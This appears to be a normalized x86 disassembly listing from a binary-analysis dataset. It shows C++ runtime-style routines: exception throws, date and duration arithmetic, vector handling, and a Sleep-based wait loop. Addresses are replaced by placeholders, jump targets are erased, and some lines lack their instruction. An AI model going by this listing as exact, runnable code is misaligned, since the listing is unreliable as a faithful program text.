call sub_1000a0db
pop ecx
lea ecx [ ebp - 0x94 ]
push ecx
mov ecx eax
mov [ ebp - 0x4 ] 0x2
call sub_1000a081
lea eax [ ebp - 0x94 ]
mov [ esp ] r--data
push eax
call sub_10023a01
int3
sub_1000a309
push 0x44
mov eax sub_100496ab
call sub_10023e33
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001d1f
and [ ebp - 0x4 ] 0x0
push eax
lea ecx [ ebp - 0x50 ]
call sub_1000a5bc
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_100023ce
mov [ ebp - 0x50 ] r--data
lea eax [ ebp - 0x50 ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1000a57c
sub_1000a353
push 0x4
mov eax sub_10048e81
call sub_10023e33
mov edi ecx
mov esi [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
push edi
mov ecx esi
call sub_1000a505
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x3c ] r--data
mov [ ebp - 0x4 ] 0x1
lea ebx [ esi + 0x28 ]
mov [ esi ] r--data
mov [ ebx ] r--data
mov [ esi + 0x3c ] r--data
test edi edi
je r-xdata
xor edi edi
add edi 0x28
jmp r-xdata
call sub_1000aa17
mov eax esi
call sub_10023f0b
retn
sub_1000a3ad
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov ecx esi
call sub_1000a54c
mov [ esi + 0x28 ] r--data
and [ esi + 0x2c ] 0x0
and [ esi + 0x30 ] 0x0
and [ esi + 0x34 ] 0x0
or [ esi + 0x38 ] 0xffffffff
mov [ esi ] r--data
mov [ esi + 0x28 ] r--data
mov eax esi
leave
retn
sub_1000a42e
push 0x4
mov eax sub_1004a281
call sub_10023e33
mov esi ecx
push 0x40
call sub_10020186
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
add esi 0xffffffc4
push esi
call sub_1000a4b4
jmp r-xdata
xor eax eax
add eax 0x3c
jmp r-xdata
test eax eax
je r-xdata
call sub_10023f0b
retn
sub_1000a505
push 0x4
mov eax sub_10048ad1
call sub_10023e33
mov esi ecx
mov [ ebp - 0x10 ] esi
mov edi [ ebp + 0x8 ]
push edi
call sub_1000a54c
xor eax eax
mov [ ebp - 0x4 ] eax
cmp edi eax
je r-xdata
lea edi [ esi + 0x28 ]
push eax
mov ecx edi
call sub_1000acbe
mov [ esi ] r--data
mov [ edi ] r--data
mov eax esi
call sub_10023f0b
retn 0x4
lea eax [ edi + 0x28 ]
sub_1000a57c
push 0x80
mov eax sub_100491af
call sub_10023e33
push [ ebp + 0x8 ]
lea esi [ ebp - 0x4c ]
call sub_1000a3ad
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x8c ]
push ecx
mov ecx eax
call sub_1000a353
pop ecx
pop ecx
push r--data
lea eax [ ebp - 0x8c ]
push eax
call sub_10023a01
int3
sub_1000a601
push 0x44
mov eax sub_10049680
call sub_10023e33
movzx esi [ ebp + 0x10 ]
push 0xe
pop eax
sub eax esi
cdq
push 0xc
pop ecx
idiv ecx
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
push 0x5
pop edi
mov ebx 0x190
push 0x64
movzx eax ax
sub ecx eax
imul eax eax 0xc
lea eax [ eax + edx - 0x3 ]
movzx eax ax
movzx eax ax
imul eax eax 0x99
add ecx 0x12c0
inc eax
inc eax
cdq
idiv edi
movzx ecx cx
movzx ecx cx
mov edi eax
mov eax ecx
cdq
idiv ebx
pop ebx
push 0x2
add edi eax
mov eax ecx
cdq
idiv ebx
sub edi eax
mov eax ecx
imul eax eax 0x16d
add edi eax
movzx eax [ ebp + 0x14 ]
shr ecx 0x2
add edi ecx
mov ecx [ ebp + 0x8 ]
lea eax [ edi + eax - 0x7d2d ]
mov [ ecx ] eax
pop eax
sub esi eax
je r-xdata
movzx esi [ ebp + 0xc ]
mov eax esi
and eax 0x80000003
jns r-xdata
sub esi eax
je r-xdata
jne r-xdata
dec eax
or eax 0xfffffffc
inc eax
push 0x1e
jmp r-xdata
sub esi eax
je r-xdata
push 0x1c
mov eax esi
push 0x64
cdq
pop edi
idiv edi
test edx edx
jne r-xdata
pop eax
cmp ax [ ebp + 0x14 ]
jae r-xdata
sub esi 0x3
je r-xdata
mov eax ecx
call sub_10023f0b
retn 0x10
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001d1f
and [ ebp - 0x4 ] 0x0
push eax
lea ecx [ ebp - 0x50 ]
call sub_1000a5bc
mov [ ebp - 0x50 ] r--data
lea eax [ ebp - 0x50 ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1000a57c
push 0x1d
jmp r-xdata
mov eax esi
cdq
mov esi 0x190
idiv esi
test edx edx
jne r-xdata
sub esi eax
je r-xdata
push 0x1f
jmp r-xdata
sub_1000a718
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x10 ]
mov ebx ecx
xor ecx ecx
cmp eax ecx
push edi
mov edi [ ebp + 0xc ]
jl r-xdata
neg eax
cmp ebx ecx
jl r-xdata
cmp [ ebp + 0x8 ] ecx
jge r-xdata
neg ebx
cmp [ ebp + 0x8 ] ecx
jl r-xdata
cmp esi ecx
jg r-xdata
neg [ ebp + 0x8 ]
cmp ebx ecx
jge r-xdata
cmp esi ecx
jl r-xdata
push ecx
cdq
push 0x3c
push edx
push eax
call sub_10027200
mov ecx eax
mov eax edx
mov [ ebp - 0x4 ] eax
mov eax ebx
cdq
add ecx eax
mov eax [ ebp - 0x4 ]
push 0x0
push 0x3c
adc eax edx
push eax
push ecx
call sub_10027200
mov ecx eax
mov eax [ ebp + 0x8 ]
mov ebx edx
cdq
push 0x0
add ecx eax
push 0xf4240
adc ebx edx
push ebx
push ecx
call sub_10027200
neg edi
adc esi 0x0
neg esi
sub edi eax
sbb esi edx
mov eax edi
mov edx esi
jl r-xdata
jg r-xdata
neg edi
adc esi ecx
neg esi
cmp edi ecx
jae r-xdata
push ecx
cdq
push 0x3c
push edx
push eax
call sub_10027200
mov ecx eax
mov eax edx
mov [ ebp - 0x4 ] eax
mov eax ebx
cdq
add ecx eax
mov eax [ ebp - 0x4 ]
push 0x0
push 0x3c
adc eax edx
push eax
push ecx
call sub_10027200
mov ecx eax
mov eax [ ebp + 0x8 ]
mov ebx edx
cdq
push 0x0
add ecx eax
push 0xf4240
adc ebx edx
push ebx
push ecx
call sub_10027200
add eax edi
adc edx esi
jmp r-xdata
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_1000a7fc
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ebx
call sub_1000a9d1
test al al
jne r-xdata
mov eax [ ebx ]
mov edx [ ebx + 0x4 ]
push 0xfffffffe
pop esi
mov ecx 0x7fffffff
cmp eax esi
jne r-xdata
mov esi [ ebp + 0x8 ]
call sub_1000a9d1
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp edx esi
jne r-xdata
cmp edx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebx ]
sub ecx [ eax ]
mov edx [ ebx + 0x4 ]
sbb edx [ eax + 0x4 ]
mov [ edi ] ecx
mov [ edi + 0x4 ] edx
jmp r-xdata
push [ ebx + 0x4 ]
push [ ebx ]
call sub_1000a905
pop ecx
pop ecx
test al al
je r-xdata
cmp eax ecx
je r-xdata
mov [ edi + 0x4 ] ecx
mov eax edi
pop esi
leave
retn 0x4
mov eax [ ebx ]
mov esi 0x80000000
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
call sub_1000a905
pop ecx
pop ecx
test al al
jne r-xdata
mov eax ebx
call sub_1000a9ae
test al al
je r-xdata
cmp [ ebx + 0x4 ] esi
jne r-xdata
mov [ edi + 0x4 ] 0x7fffffff
jmp r-xdata
mov eax [ ebp + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
call sub_1000a905
pop ecx
pop ecx
test al al
je r-xdata
mov eax [ ebx ]
mov [ edi ] eax
mov eax [ ebx + 0x4 ]
mov [ edi + 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov [ edi ] esi
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
and [ edi ] 0x0
mov [ edi + 0x4 ] esi
jmp r-xdata
cmp [ eax + 0x4 ] esi
jne r-xdata
cmp [ eax + 0x4 ] esi
jne r-xdata
push 0xfffffffe
pop esi
or [ edi ] 0xffffffff
mov [ edi + 0x4 ] 0x7fffffff
jmp r-xdata
sub_1000a91d
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0xfffffffe
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x7fffffff
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000a905
movzx eax al
neg eax
sbb eax eax
pop ecx
and eax 0xfffffffd
pop ecx
add eax 0x5
pop ebp
retn
cmp [ ebp + 0xc ] 0x80000000
jne r-xdata
xor eax eax
pop ebp
retn
xor eax eax
inc eax
pop ebp
retn
sub_1000a963
sub ecx 0x0
je r-xdata
mov [ eax + 0x4 ] 0x7fffffff
dec ecx
je r-xdata
and [ eax ] 0x0
dec ecx
je r-xdata
or [ eax ] 0xffffffff
mov [ eax + 0x4 ] 0x7fffffff
retn
dec ecx
je r-xdata
mov [ eax ] 0x1
jmp r-xdata
dec ecx
mov [ eax + 0x4 ] 0x7fffffff
jne r-xdata
mov [ eax + 0x4 ] 0x80000000
retn
mov [ eax ] 0xfffffffe
retn
mov [ eax ] 0xfffffffd
retn
sub_1000a9ae
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
test ecx ecx
jne r-xdata
cmp ecx 0xffffffff
jne r-xdata
cmp eax 0x80000000
je r-xdata
xor eax eax
retn
cmp eax 0x7fffffff
je r-xdata
xor eax eax
inc eax
retn
sub_1000a9d1
mov eax esi
call sub_1000a9ae
test al al
jne r-xdata
xor eax eax
inc eax
retn
cmp [ esi ] 0xfffffffe
jne r-xdata
xor eax eax
retn
cmp [ esi + 0x4 ] 0x7fffffff
je r-xdata
sub_1000a9f1
mov ecx [ esi ]
push edi
mov edi [ eax ]
test ecx ecx
je r-xdata
mov [ esi ] edi
test edi edi
je r-xdata
mov eax [ ecx ]
call [ eax + 0x10 ]
test al al
je r-xdata
mov eax esi
pop edi
retn
mov eax [ edi ]
mov ecx edi
call [ eax + 0xc ]
and [ esi ] 0x0
sub_1000aa17
push 0x8
mov eax sub_1004899a
call sub_10023e33
and [ ebp - 0x10 ] 0x0
and [ ebp - 0x4 ] 0x0
mov ecx [ edi + 0x4 ]
test ecx ecx
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
mov eax [ edi + 0x10 ]
mov [ ebx + 0x10 ] eax
mov eax [ edi + 0x8 ]
mov [ ebx + 0x8 ] eax
lea esi [ ebx + 0x4 ]
lea eax [ ebp - 0x10 ]
call sub_1000a9f1
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0x10 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
lea edx [ ebp - 0x14 ]
push edx
call [ eax + 0x14 ]
lea esi [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x1
call sub_1000a9f1
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x14 ]
test ecx ecx
je r-xdata
call sub_10023f0b
retn
mov eax [ ecx ]
call [ eax + 0x10 ]
mov eax [ ecx ]
call [ eax + 0x10 ]
test al al
je r-xdata
and [ ebp - 0x14 ] 0x0
sub_1000aa92
push 0x4
mov eax sub_10048e53
call sub_10023e33
mov edi ecx
mov esi [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
push edi
mov ecx esi
call sub_1000ac64
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x3c ] r--data
mov [ ebp - 0x4 ] 0x1
lea ebx [ esi + 0x28 ]
mov [ esi ] r--data
mov [ ebx ] r--data
mov [ esi + 0x3c ] r--data
test edi edi
je r-xdata
xor edi edi
add edi 0x28
jmp r-xdata
call sub_1000aa17
mov eax esi
call sub_10023f0b
retn
sub_1000aaec
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov ecx esi
call sub_10001ce5
mov [ esi + 0x28 ] r--data
and [ esi + 0x2c ] 0x0
and [ esi + 0x30 ] 0x0
and [ esi + 0x34 ] 0x0
or [ esi + 0x38 ] 0xffffffff
mov [ esi ] r--data
mov [ esi + 0x28 ] r--data
mov eax esi
leave
retn
sub_1000ab6e
push 0x4
mov eax sub_1004a281
call sub_10023e33
mov esi ecx
push 0x40
call sub_10020186
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
add esi 0xffffffc4
push esi
call sub_1000abf4
jmp r-xdata
xor eax eax
add eax 0x3c
jmp r-xdata
test eax eax
je r-xdata
call sub_10023f0b
retn
sub_1000ac21
push esi
mov esi ecx
mov [ esi ] r--data
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
pop esi
retn
mov eax [ ecx ]
call [ eax + 0x10 ]
test al al
je r-xdata
and [ esi + 0x4 ] 0x0
sub_1000ac64
push 0x4
mov eax sub_10048aae
call sub_10023e33
mov esi ecx
mov [ ebp - 0x10 ] esi
mov edi [ ebp + 0x8 ]
push edi
call sub_10001ce5
xor eax eax
mov [ ebp - 0x4 ] eax
cmp edi eax
je r-xdata
lea edi [ esi + 0x28 ]
push eax
mov ecx edi
call sub_1000acbe
mov [ esi ] r--data
mov [ edi ] r--data
mov eax esi
call sub_10023f0b
retn 0x4
lea eax [ edi + 0x28 ]
sub_1000acbe
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
mov [ esi ] r--data
mov ecx [ edi + 0x4 ]
mov [ esi + 0x4 ] ecx
test ecx ecx
je r-xdata
mov eax [ edi + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ edi + 0xc ]
mov [ esi + 0xc ] eax
mov eax [ edi + 0x10 ]
mov [ esi + 0x10 ] eax
pop edi
mov eax esi
pop esi
retn 0x4
mov eax [ ecx ]
call [ eax + 0xc ]
sub_1000ad1c
push 0x80
mov eax sub_10049189
call sub_10023e33
push [ ebp + 0x8 ]
lea esi [ ebp - 0x4c ]
call sub_1000aaec
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x8c ]
push ecx
mov ecx eax
call sub_1000aa92
pop ecx
pop ecx
push r--data
lea eax [ ebp - 0x8c ]
push eax
call sub_10023a01
int3
sub_1000ad5c
push esi
mov esi ecx
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
pop esi
retn
mov eax [ esi ]
mov ecx esi
call [ eax + 0x4 ]
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax [ esi ]
mov ecx esi
pop esi
jmp [ eax + 0x8 ]
sub_1000add8
push 0x4
mov eax sub_10048c1b
call sub_10023e33
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
mov ecx [ esi + 0x20 ]
test ecx ecx
je r-xdata
push 0x0
push 0x1
lea ecx [ esi + 0x4 ]
call sub_10002597
call sub_10023f0b
retn
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_1000ae12
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004a4c7
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4c
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x58 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ esi + 0x20 ]
xor edi edi
cmp eax edi
je r-xdata
push 0x44
call sub_10020186
pop ecx
mov [ esp + 0xc ] eax
mov [ esp + 0x60 ] 0x1
cmp eax edi
je r-xdata
push r--data
lea ecx [ esp + 0x14 ]
call sub_10001d1f
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x30 ]
mov [ esp + 0x64 ] edi
call sub_10001d6b
push r--data
lea eax [ esp + 0x30 ]
push eax
call sub_10023a01
or [ esp + 0x60 ] 0xffffffff
mov ecx [ esi + 0x20 ]
cmp edi ecx
je r-xdata
lea ecx [ esi + 0x4 ]
push ecx
push eax
call sub_10013608
mov edi eax
mov [ esi + 0x20 ] edi
mov ecx [ esp + 0x58 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_1000aed1
push 0x1c
mov eax sub_1004993b
call sub_10023e33
mov esi ecx
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001d1f
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ esi ]
lea ecx [ ebp - 0x28 ]
push ecx
mov ecx esi
call [ eax + 0x14 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_100023ce
call sub_10023f0b
retn 0x4
sub_1000af12
push 0x1c
mov eax sub_1004993b
call sub_10023e33
mov esi ecx
push 0x0
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x10 ] 0xf
call sub_10002493
and [ ebp - 0x4 ] 0x0
mov eax [ esi ]
lea ecx [ ebp - 0x28 ]
push ecx
push [ ebp + 0x8 ]
mov ecx esi
call [ eax + 0x14 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_100023ce
call sub_10023f0b
retn 0x4
sub_1000af57
push ecx
push ecx
and [ esp + 0x4 ] 0x0
push ebx
mov ebx ecx
mov ecx [ eax + 0x20 ]
test ecx ecx
jne r-xdata
push ebx
push ecx
call sub_100136de
lea ecx [ eax + 0x4 ]
call sub_10013597
jmp r-xdata
mov eax ebx
pop ebx
pop ecx
pop ecx
retn
sub_1000af7f
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004a7af
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x40 ]
mov [ fs : 0x0 ] eax
mov eax ecx
lea ecx [ esp + 0x18 ]
call sub_1000af57
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ esp + 0x48 ] ebx
mov eax [ edi + 0x14 ]
mov [ esp + 0x14 ] eax
lea eax [ esp + 0x14 ]
push eax
push [ esp + 0x1c ]
push 0x4
pop esi
call sub_100138d0
mov esi [ esp + 0x14 ]
cmp esi ebx
jle r-xdata
lea eax [ esp + 0x10 ]
push eax
push [ esp + 0x1c ]
mov [ esp + 0x18 ] ebx
push 0x4
pop esi
call sub_1001396c
push [ esp + 0x10 ]
lea esi [ esp + 0x24 ]
call sub_1000b1c4
mov esi [ ebp + 0xc ]
push 0xffffffff
push ebx
push eax
mov ecx esi
mov [ esp + 0x54 ] 0x1
call sub_100021b2
push ebx
push 0x1
lea ecx [ esp + 0x28 ]
mov [ esp + 0x50 ] bl
call sub_100023ce
cmp [ esp + 0x10 ] ebx
jle r-xdata
cmp [ edi + 0x18 ] 0x10
jb r-xdata
or [ esp + 0x48 ] 0xffffffff
mov ecx [ esp + 0x1c ]
cmp ecx ebx
je r-xdata
cmp [ esi + 0x18 ] 0x10
jb r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
mov ecx [ esp + 0x40 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_1000ad5c
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
push edi
push [ esp + 0x1c ]
call sub_100138d0
push esi
push [ esp + 0x1c ]
mov esi [ esp + 0x18 ]
call sub_1001396c
sub_1000b085
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004a777
mov eax [ fs : 0x0 ]
push eax
sub esp 0x50
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x48 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x60 ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov eax ecx
lea ecx [ esp + 0x14 ]
call sub_1000af57
lea eax [ esp + 0x10 ]
push eax
xor ebx ebx
mov [ esp + 0x6c ] ebx
push [ esp + 0x18 ]
mov [ esp + 0x18 ] ebx
push 0x4
pop esi
call sub_1001396c
push [ esp + 0x10 ]
lea esi [ esp + 0x40 ]
call sub_1000b1c4
mov [ esp + 0x68 ] 0x1
mov esi [ esp + 0x10 ]
cmp esi ebx
jle r-xdata
push ebx
lea ecx [ esp + 0x24 ]
mov [ esp + 0x3c ] 0xf
call sub_10002493
lea ecx [ esp + 0x20 ]
push ecx
lea ecx [ esp + 0x40 ]
mov [ esp + 0x6c ] 0x2
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x4 ]
mov eax [ esp + 0x34 ]
mov [ esp + 0x1c ] eax
lea eax [ esp + 0x1c ]
push eax
push [ esp + 0x18 ]
push 0x4
pop esi
call sub_100138d0
mov esi [ esp + 0x1c ]
cmp esi ebx
jle r-xdata
cmp [ esp + 0x54 ] 0x10
mov eax [ esp + 0x40 ]
jae r-xdata
push ebx
push 0x1
lea ecx [ esp + 0x28 ]
call sub_100023ce
push ebx
push 0x1
lea ecx [ esp + 0x44 ]
call sub_100023ce
or [ esp + 0x68 ] 0xffffffff
mov ecx [ esp + 0x18 ]
cmp ecx ebx
je r-xdata
cmp [ esp + 0x38 ] 0x10
mov eax [ esp + 0x24 ]
jae r-xdata
push eax
push [ esp + 0x18 ]
call sub_1001396c
lea eax [ esp + 0x40 ]
mov ecx [ esp + 0x60 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x48 ]
xor ecx esp
call sub_10020040
mov esp ebp
pop ebp
retn 0x4
call sub_1000ad5c
push eax
push [ esp + 0x18 ]
call sub_100138d0
lea eax [ esp + 0x24 ]
sub_1000b202
push 0x4
mov eax sub_10048a4d
call sub_10023e33
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x18 ]
push eax
call sub_1000927e
mov ecx esi
mov [ esi ] r--data
call sub_100132ab
call sub_10023f0b
retn
sub_1000b239
push 0x44
mov eax sub_1004a07c
call sub_10023e33
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
lea eax [ ebp + 0x8 ]
push eax
lea eax [ esi + 0x18 ]
call sub_1000b3c2
push [ ebp + 0x8 ]
call sub_1001156d
mov al [ esi + 0x10 ]
test al al
jne r-xdata
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001d1f
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x4 ] 0x1
call sub_10001d6b
push r--data
lea eax [ ebp - 0x50 ]
push eax
call sub_10023a01
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
push esi
call sub_1001156d
call sub_10023f0b
retn 0x8
call sub_1000ad5c
sub_1000b2b3
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x24
push ebx
push esi
push edi
lea edi [ ecx + 0x18 ]
call sub_1002059f
cmp eax [ esp + 0x28 ]
je r-xdata
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
lea esi [ esp + 0x18 ]
call sub_100092a6
mov eax [ eax ]
cmp [ eax + 0x50 ] 0x1
jne r-xdata
mov eax [ esp + 0x1c ]
cmp eax [ esp + 0x2c ]
je r-xdata
mov ebx [ edi + 0xc ]
lea esi [ esp + 0x20 ]
call sub_10001909
mov eax [ esp + 0x20 ]
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x24 ]
mov [ esp + 0x1c ] eax
lea esi [ esp + 0x18 ]
call sub_100092ce
jmp r-xdata
mov al [ eax + 0x11 ]
cmp al 0x1
je r-xdata
mov ebx [ edi + 0x10 ]
lea esi [ esp + 0x28 ]
call sub_10001909
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x1c ]
mov eax [ edi + 0x10 ]
lea ebx [ ecx + 0x8 ]
mov [ esp + 0x10 ] eax
cmp ebx eax
je r-xdata
mov eax [ edi + 0x10 ]
push eax
add eax 0xfffffff8
call sub_100095c8
mov ebx [ esp + 0x1c ]
add [ edi + 0x10 ] 0xfffffff8
lea esi [ esp + 0x10 ]
call sub_10001909
mov [ esp + 0xc ] ecx
sub [ esp + 0xc ] ebx
mov eax [ esp + 0xc ]
lea esi [ eax + ebx ]
mov eax ebx
call sub_100137aa
add ebx 0x8
cmp ebx [ esp + 0x10 ]
jne r-xdata
sub_1000b385
push 0x0
mov eax sub_10049166
call sub_10023e33
mov esi [ esp + 0x24 ]
push 0x0
push 0x1
call sub_10001b38
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ esi ] eax
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
and [ esi + 0x14 ] 0x0
mov eax esi
call sub_10023f0b
retn 0x4
sub_1000b3c2
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
push esi
push edi
mov edi eax
mov ecx [ edi + 0xc ]
test ecx ecx
jne r-xdata
mov eax [ edi + 0x14 ]
sub eax ecx
sar eax 0x3
xor eax eax
jmp r-xdata
lea esi [ esp + 0x10 ]
call sub_10001909
push [ esp + 0x14 ]
lea eax [ esp + 0x14 ]
push [ esp + 0x14 ]
push [ ebp + 0x8 ]
push eax
mov eax edi
call sub_1000b42a
push [ ebp + 0x8 ]
xor esi esi
inc esi
call sub_1000b4d1
mov [ edi + 0x10 ] eax
jmp r-xdata
mov ebx [ edi + 0x10 ]
mov edx ebx
sub edx ecx
sar edx 0x3
cmp edx eax
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_1000b42a
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0xc ]
mov eax [ edi + 0x10 ]
sub eax ebx
test eax 0xfffffff8
jne r-xdata
lea esi [ ebp - 0x8 ]
call sub_10001909
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
call sub_1002059f
cmp eax [ ebp - 0x8 ]
je r-xdata
push [ ebp + 0x14 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x10 ]
push edi
call sub_1000b4f8
mov ebx [ edi + 0xc ]
lea esi [ ebp - 0x10 ]
call sub_10001909
mov edi [ ebp - 0x10 ]
mov esi [ ebp - 0xc ]
mov ebx edi
mov [ ebp - 0xc ] esi
test edi edi
jne r-xdata
mov eax [ edi ]
jmp r-xdata
call sub_1002059f
xor eax eax
mov eax [ ebp + 0x14 ]
sub eax [ ebp - 0x4 ]
sar eax 0x3
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
lea esi [ esi + ecx * 8 ]
cmp esi [ eax + 0x10 ]
ja r-xdata
call sub_1002059f
test edi edi
je r-xdata
xor edi edi
mov edi [ edi ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax + 0x4 ] esi
pop esi
mov [ eax ] ebx
pop ebx
leave
retn 0x10
cmp esi [ edi + 0xc ]
jae r-xdata
sub_1000b4d1
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0x8 ]
mov eax ebx
push esi
call sub_1000b7a4
add esp 0xc
lea eax [ ebx + esi * 8 ]
pop edi
leave
retn 0x4
sub_1000b4f8
push 0x18
mov eax sub_10049143
call sub_10023e66
mov ebx ecx
mov edi [ ebp + 0x8 ]
mov edx [ edi + 0xc ]
test edx edx
jne r-xdata
mov eax [ edi + 0x14 ]
sub eax edx
sar eax 0x3
mov [ ebp - 0x18 ] eax
and [ ebp - 0x18 ] edx
jmp r-xdata
inc eax
cmp [ ebp - 0x18 ] eax
jae r-xdata
call sub_10001880
mov ecx [ edi + 0x10 ]
mov eax ecx
sub eax edx
mov edx 0x1fffffff
sar eax 0x3
mov esi edx
sub esi eax
cmp esi 0x1
jae r-xdata
sub ecx [ ebp + 0x10 ]
mov eax [ ebx ]
xor esi esi
sar ecx 0x3
inc esi
add ebx 0x4
cmp ecx esi
mov [ ebp - 0x24 ] eax
push ebx
lea ecx [ ebp - 0x20 ]
jae r-xdata
mov ecx [ ebp - 0x18 ]
shr ecx 0x1
sub edx ecx
cmp edx [ ebp - 0x18 ]
jae r-xdata
call sub_1000ad88
mov [ ebp - 0x4 ] 0x5
mov esi [ edi + 0x10 ]
push esi
lea ebx [ esi - 0x8 ]
push esi
mov ecx ebx
call sub_1000b780
mov [ edi + 0x10 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp + 0x8 ] eax
cmp eax ebx
je r-xdata
call sub_1000ad88
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp + 0x10 ]
lea eax [ ecx + 0x8 ]
push eax
push [ edi + 0x10 ]
call sub_1000b780
mov [ ebp - 0x4 ] 0x3
mov ebx [ edi + 0x10 ]
lea eax [ ebp - 0x24 ]
